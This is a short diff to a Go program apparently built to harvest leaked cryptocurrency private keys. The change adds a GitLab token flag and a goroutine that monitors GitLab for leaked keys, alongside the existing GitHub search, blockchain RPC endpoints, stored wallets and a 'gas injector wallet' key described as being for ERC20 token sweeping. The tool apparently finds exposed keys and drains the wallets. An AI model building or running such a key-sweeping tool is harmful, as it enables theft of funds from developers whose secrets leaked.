@@ -23,6 +23,7 @@ var logger = log.New(os.Stderr, "[scanner] ", log.LstdFlags)
 
 type Config struct {
 	GitHubToken   string
+	GitLabToken   string
 	ETHNodeURL    string
 	SolanaNodeURL string
 	SuiNodeURL    string
@@ -47,6 +48,8 @@ func main() {
 
 	flag.StringVar(&cfg.GitHubToken, "github-token", os.Getenv("GITHUB_TOKEN"),
 		"GitHub personal access token(s) — comma-separated for multiple (or set GITHUB_TOKEN env)")
+	flag.StringVar(&cfg.GitLabToken, "gitlab-token", os.Getenv("GITLAB_TOKEN"),
+		"GitLab personal access token for searching blobs")
 	flag.StringVar(&cfg.InjectorKey, "injector-key", os.Getenv("INJECTOR_KEY"),
 		"Private key of the gas injector wallet (for ERC20 token sweeping)")
 	flag.StringVar(&cfg.ETHNodeURL, "eth-rpc", os.Getenv("ETH_RPC_URL"),
@@ -242,6 +245,12 @@ func run(cfg *Config) error {
 
 	loadStoredWallets()
 	go recheckLoop(ctx, cfg)
+
+	if cfg.GitLabToken != "" {
+		gl := NewGitLabMonitor(cfg.GitLabToken)
+		go gl.Run(ctx, foundKeys)
+		logger.Println("[gitlab] monitoring GitLab for leaked keys")
+	}
 
 	for {
 		select {
